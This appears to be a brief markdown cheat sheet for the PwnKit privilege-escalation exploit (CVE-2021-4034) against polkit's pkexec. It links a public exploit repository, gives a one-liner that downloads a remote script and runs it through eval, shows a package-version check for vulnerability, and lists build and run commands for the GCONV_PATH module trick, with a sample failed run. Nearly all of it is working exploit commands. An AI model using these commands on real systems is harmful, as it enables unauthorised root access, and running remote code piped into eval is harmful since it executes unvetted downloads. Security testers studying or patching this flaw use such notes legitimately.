# PwnKit

https://github.com/berdav/CVE-2021-4034

## Download

https://codeload.github.com/berdav/CVE-2021-4034/zip/main

## One-liner

    eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"

## Check

Command:

    apt-cache policy policykit-1

Vulnerable:

    policykit-1:
    Installed: 0.105-20ubuntu0.18.04.5
    Candidate: 0.105-20ubuntu0.18.04.5

Not vulnerable:

    policykit-1:
    Installed: 0.105-20ubuntu0.18.04.6
    Candidate: 0.105-20ubuntu0.18.04.6

## Build

With make

    make

Without make

    cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
    `cc -Wall    cve-2021-4034.c   -o cve-2021-4034`
    echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
    mkdir -p GCONV_PATH=.
    cp /usr/bin/true GCONV_PATH=./pwnkit.so:.

## Run

    ./cve-2021-4034

Example when not working:

    floki@vikings:~/CVE$ ./cve-2021-4034
    GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
    pkexec --version |
    --help |
    --disable-internal-agent |
    [--user username] PROGRAM [ARGUMENTS...]
    
    See the pkexec manual page for more details.
